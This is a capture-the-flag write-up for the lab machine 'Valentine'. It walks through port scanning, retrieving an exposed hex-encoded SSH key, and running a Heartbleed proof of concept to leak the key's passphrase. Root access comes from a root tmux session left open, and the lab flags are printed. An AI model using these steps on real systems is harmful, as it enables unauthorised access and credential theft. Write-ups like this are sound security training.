
## CTF Writeup: Valentine

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.232.136
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-19 13:36 -0500
Nmap scan report for 10.129.232.136
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_ssl-date: 2026-09-19T18:38:24+00:00; 0s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.49 seconds
```

The TCP Scan reveals that SSH, HTTP & HTTPS are open. 
The Certificate of the webservice revealed an interesting Subject Alternative Name "valentine.htb", let's map it to the target ip address in our local dns file.

```
echo "10.129.232.136 valentine.htb" | tee -a /etc/hosts
```

Upon inspecting the webservice in the browser it just a plain picture of an women screaming and a heart. Could this be steganography? I downloaded the picture onto my local machine and firstly ran exiftool over it to find interesting Metadata, but couldn't find anything interesting.

```
exiftool /home/unkn0wnxxx/Desktop/omg.jpg
```

In order to extract hidden data out of the picture we'll need steghide and stegseek. 

Unfortunately trying to bruteforce an passphrase didn't work which means we can't extract hidden data. SInce this didn't work I'm assuming this picture isn't the way-to-go. Let's proceed with enumerating endpoints.

```
stegseek -sf /home/unkn0wnxxx/Desktop/omg.jpg -wl /usr/share/wordlists/rockyou.txt
```

Ran feroxbuster & identified an interesting /dev directory. Including an /dev/notes.txt. Let's inspect the notes.txt first.

```
feroxbuster --url http://valentine.htb
```

Downloaded the /notes.txt file onto my local machine.

```
wget http://valentine.htb/dev/notes.txt .
```

It provides us with information about an potential decoding/encoding tool and an potential hint that the decoder/encoder works server-sided still and is still in development.

```
cat notes.txt                               
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

Upon inspecting the /dev directory it's simply an webserver in which the notes.txt file is stored, but also another "hype_key" file. It seems to be hex encoded! Let's download it aswell onto the local machine.

```
wget http://valentine.htb/dev/hype_key
```

The file is ASCII.

```
file hype_key                                
hype_key: ASCII text, with very long lines (5381)
```

After some time our feroxbuster scan also retrieved an /encode endpoint and an /decode.php endpoint!

I decoded the hype_key file using xxd and gained an potential ssh key!

```
cat hype_key | xxd -r -p
```

Unfortunately I can't connect to SSH as the "hype" user, because of bad format and a missing passphrase. I also ran an script scan and identified port 443 being vulnerable to the heartbleed vulnerability, which is an vulnerability which allows attackers to get more memory chunks that they should be. Which could potentially lead to critical information disclosure.

```
nmap -n -Pn -sSCV --script vuln -p 22,80,443 valentine.htb
```

Let's actually search for PoC's.

```
searchsploit heartbleed
```

```
searchsploit -m exploits/multiple/remote/32745.py
```

Ran the exploit & found an interesting base64 encoded parameter.

```
python2 32745.py 10.129.232.136
```

```
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Decoded it and identified an potential passphrase!

```
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d                    
heartbleedbelievethehype
```

Saved the decrypted value inside the following file:

```
cat hype_key | xxd -r -p > hype_key_encrypted
```

Had issues with connecting to the server, due to "no mutual signature supported". Was able to fix it like this:

```
ssh -i hype_key_encrypted -o PubkeyAcceptedAlgorithms=+ssh-rsa hype@valentine.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'hype_key_encrypted': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

hype@Valentine:~$
```

Retrieved user.txt in /home/hype directory.

```
3744ec41bf11dd77aec4e145e0e72b6f
```

## Privilege Escalation

Definitly one of the easiest priv esc's i've ever done. I simply checked out the history file of the user "hype". Which had an open tmux session as root user.

Prompted the following command in order to connect to this tmux session and gained root shell!

```
tmux -S /.devs/dev_sess
```

Retrieved root.txt in /root directory.

```
c28b54682426b4ffc9feae3510ed6603
```